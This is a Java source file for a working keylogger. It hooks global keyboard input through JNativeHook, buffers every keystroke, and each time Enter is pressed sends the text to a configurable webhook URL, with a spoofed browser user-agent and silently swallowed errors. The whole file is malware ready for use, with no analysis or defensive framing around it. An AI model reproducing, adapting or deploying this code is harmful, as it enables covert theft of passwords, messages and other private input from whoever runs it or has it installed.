package apple26j;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import javax.net.ssl.HttpsURLConnection;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;

public class Main implements NativeKeyListener
{
    /*
     * The WebHook
    */
    public static final String webHook = "Paste WebHook Here";

    private boolean capsLock = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
    private String text = "";

    public static void main(String[] args)
    {
        try
        {
            GlobalScreen.registerNativeHook();
        }

        catch (Exception e)
        {
            ;
        }

        GlobalScreen.addNativeKeyListener(new Main());
    }

    public void nativeKeyTyped(NativeKeyEvent nativeEvent)
    {
        if (nativeEvent.getKeyChar() != 8 && nativeEvent.getKeyChar() != 13)
        {
            this.text += this.capsLock ? String.valueOf(nativeEvent.getKeyChar()).toUpperCase() : nativeEvent.getKeyChar();
        }
    }

    public void nativeKeyPressed(NativeKeyEvent nativeEvent)
    {
        if (nativeEvent.getKeyCode() == 14)
        {
            if (this.text.length() > 0)
            {
                this.text = this.text.substring(0, this.text.length() - 1);
            }
        }

        else if (nativeEvent.getKeyCode() == 28)
        {
            this.sendMessage(this.text);
            this.text = "";
        }

        else if (nativeEvent.getKeyCode() == 58)
        {
            this.capsLock = !this.capsLock;
        }
    }

    public void sendMessage(String message)
    {
        try
        {
            HttpsURLConnection httpsURLConnection = ((HttpsURLConnection) (new URL(webHook)).openConnection());
            httpsURLConnection.setRequestProperty("accept", "*/*");
            httpsURLConnection.setRequestProperty("connection", "Keep-Alive");
            httpsURLConnection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            httpsURLConnection.setDoOutput(true);
            httpsURLConnection.setDoInput(true);
            PrintWriter printWriter = new PrintWriter(httpsURLConnection.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            printWriter.print(postData);
            printWriter.flush();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpsURLConnection.getInputStream()));

            while (bufferedReader.readLine() != null)
            {
                ;
            }

            bufferedReader.close();
            printWriter.close();
        }

        catch (Exception e)
        {
            ;
        }
    }
}
